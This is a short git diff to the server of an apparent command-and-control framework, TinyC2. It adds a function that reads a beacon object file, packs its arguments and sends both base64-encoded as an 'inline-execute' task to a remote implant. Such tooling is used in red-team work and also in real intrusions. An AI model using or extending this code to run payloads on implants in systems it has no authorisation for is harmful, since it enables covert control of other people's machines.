@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
+	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"
 
 	"github.com/pterm/pterm"
 )
@@ -583,4 +584,27 @@ func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string
 	})
 
 	return nil
+}
+
+func (e *Engine) ImplantInlineExecute(id uint32, bof string, packorder string, args []string) {
+	// read bof
+	bofraw, err := os.ReadFile(bof)
+	if err != nil {
+		logger.Error("failed to read beacon object file: %v", err)
+		return
+	}
+
+	// pack arguments
+	bofargs, err := pack.BofPack(packorder, args)
+	if err != nil {
+		logger.Error("failed to pack beacon object file arguments: %v", err)
+		return
+	}
+
+	// execute task
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "inline-execute",
+		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
+		"artifact": base64.StdEncoding.EncodeToString(bofraw),
+	})
 }
